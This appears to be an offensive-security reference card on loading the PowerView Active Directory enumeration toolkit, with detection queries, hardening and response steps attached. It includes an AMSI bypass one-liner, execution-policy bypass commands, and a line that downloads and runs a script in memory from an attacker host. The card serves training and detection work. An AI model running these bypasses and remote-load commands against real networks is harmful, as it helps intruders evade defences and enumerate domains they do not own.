name: PowerView - Import Module
description: Imports the PowerView PowerShell module into the current session. Required before running any Get-Domain*, Find-*, Invoke-* PowerView commands. PowerView is the most comprehensive AD enumeration toolkit available in PowerShell - single script, no dependencies, runs from any Windows host with domain connectivity.
source: CPTS Module 13: Active Directory Enumeration & Attacks
notes:
=== POWERVIEW OVERVIEW ===
PowerView (part of PowerSploit) is a PowerShell script that wraps complex LDAP
queries, RPC calls, and AD API calls into easy-to-use cmdlets. It's the foundation
for PowerShell-based AD enumeration and attack in CPTS/OSCP/CRTP.

Key cmdlet families:
  Get-Domain*      → enumerate domain objects (users, computers, groups, etc.)
  Find-*           → search for specific conditions (interesting ACLs, admin access)
  Add-Domain*      → modify AD objects
  Set-Domain*      → modify AD attributes (for ACL abuse)
  Invoke-*         → active attack techniques
  Convert-*        → data conversion (SID → name, etc.)
  Test-*           → test connectivity or permissions

=== BYPASS EXECUTION POLICY ===
If execution policy blocks the import:
  powershell -ep bypass
  or: Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
  or: IEX (New-Object Net.WebClient).DownloadString('<url_or_path>')

=== AMSI EVASION ===
AMSI may flag PowerView.ps1. Common bypass:
  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
  Then: Import-Module .\PowerView.ps1

=== DOWNLOAD AND IMPORT IN MEMORY ===
IEX (New-Object Net.WebClient).DownloadString('http://<attacker>/PowerView.ps1')
Avoiding disk touch - useful for OPSEC. Also covered in: OSCP PEN-200 Chapter 21 (Active Directory Introduction and Enumeration).

defense.why_it_works: PowerView is a pure-PowerShell LDAP client; importing it (dot-sourcing) just loads functions - it needs no special privilege because it only performs reads any user can do.
defense.prerequisites: A PowerShell session on a domain host (PowerView is third-party).
defense.impact: A powerful AD enumeration toolkit loaded in memory.
defense.detection: [MITRE T1059.001] PowerView is a well-known offensive script - script-block logging (4104) and AMSI catch its functions; loading it is itself a signal.
defense.artifacts: PowerView functions in 4104 logs; the script loaded in memory.
defense.splunk_spl:
index=wineventlog EventCode=4104 (ScriptBlockText=\"*Import-Module*\" OR ScriptBlockText=\"*PowerView.ps1*\")
| table _time, Computer, User, ScriptBlockText
defense.sentinel_kql:
DeviceEvents
| where ActionType == "PowerShellCommand"
| where ProcessCommandLine has_any ("Import-Module", "PowerView.ps1")
| project Timestamp, DeviceName, InitiatingProcessAccountName, ProcessCommandLine
| sort by Timestamp desc
defense.prevention: Script-block logging + AMSI; constrained language mode; application control on script execution.
defense.evasion: Load in memory (IEX) to avoid disk; rename/obfuscate functions to dodge AMSI/signatures.
defense.misconfiguration: Active Directory's default read ACL allows any authenticated domain user to enumerate nearly the entire directory: all user accounts, groups, SPNs, computer objects, trust relationships, and many sensitive attributes. There is no built-in 'need to know' principle on LDAP reads. BloodHound, PowerView, and ldapsearch all exploit these open default ACLs to map attack paths.
defense.vulnerable_config:
# AD default permissions - authenticated users can read:
# All user objects: sAMAccountName, userPrincipalName, memberOf, servicePrincipalName
# All computer objects: DNS names, OS versions, operating system attributes
# All group memberships, GPOs, OU structure, domain trusts

# Verify with any low-priv account:
Get-ADUser -Filter * -Properties *  # returns all users + attributes
Get-ADGroup -Filter * | Get-ADGroupMember  # all group memberships
defense.secure_config:
# 1. Enable AD Recycle Bin + Protected Users group
# 2. Audit and tighten ACLs on sensitive attributes:
#    msDS-AllowedToDelegateTo, adminCount, memberOf for privileged groups

# 3. Disable SMB null sessions + restrict LDAP anonymous binds (see smb/ldap cards)

# 4. Detect enumeration via volume:
# Sysmon Event 3 (network connection) from non-DC to DC on port 389/636
# Event 4661 - access to SAM objects (high-volume; baseline first)
# Microsoft Defender for Identity: 'Account Enumeration Reconnaissance' alert

# 5. Deploy Honey accounts/objects:
# Fake high-priv account (no real access) - any LDAP query for it = attacker
# BloodHound run from non-DC = detectable via DC LDAP traffic volume

# 6. Tiered administration: Tier 0 DCs, Tier 1 servers, Tier 2 workstations
#    Each tier can only query its own tier's objects

validation.success_criteria: At least one behavioral detection fires within 60 seconds of attack execution
response_steps: Correlate alert with source host, user account, and timestamp
Review PowerShell Script Block / Module Logs, Windows Security Event Log for surrounding context (5 min before/after)
Verify whether the activity matches known administrative baselines or change windows
If confirmed malicious, isolate the host and escalate to incident response

variations.label: Load fileless (after AMSI bypass)
variations.description: Downloads and executes a PowerShell script directly in memory without writing to disk. Common initial access and tool staging technique - bypasses disk-based AV scanning.

explain:
Loads the PowerView enumeration toolkit into the session:
  Import-Module .\PowerView.ps1   make the Get-Domain*/Find-*/Invoke-* cmdlets available
Required before any PowerView command; run 'powershell -ep bypass' first if the execution policy blocks it, or load it fileless with IEX (New-Object Net.WebClient).DownloadString('http://<ip>/PowerView.ps1') to avoid touching disk.
